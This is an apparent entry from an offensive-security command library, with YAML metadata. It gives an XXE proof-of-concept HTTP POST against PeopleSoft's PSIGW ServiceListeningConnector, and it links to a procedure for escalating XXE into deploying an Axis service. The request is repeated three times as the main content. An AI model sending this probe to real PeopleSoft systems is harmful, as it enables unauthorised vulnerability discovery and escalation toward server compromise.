---
data: |-
  POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
  Host: https://███
  Content-type: text/xml
  Content-Length: 50
  <!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE"><a></a>
tags:
  - xxe
  - poc
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 97f0904d-ac58-4624-9390-357eda6e6b1a
created_at: '2025-12-13T09:00:33.615Z'
updated_at: '2025-12-13T09:00:33.615Z'
verified: false
validated: true
submitted: true
---
# POST XXE POC

## Command

```bash
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: https://███
Content-type: text/xml
Content-Length: 50
<!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE"><a></a>
```

## Description

Initial proof-of-concept to demonstrate XXE by sending malicious XML with an external entity.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `PUBLIC` | Defines an external entity reference | Yes |

## Examples

### Basic Usage

```bash
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: https://███
Content-type: text/xml
Content-Length: 50
<!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE"><a></a>
```

## Expected Output

Error or entity resolution output indicating XXE vulnerability.

## Related

- [[procedures/Exploit-XXE-to-Deploy-Axis-Service]]
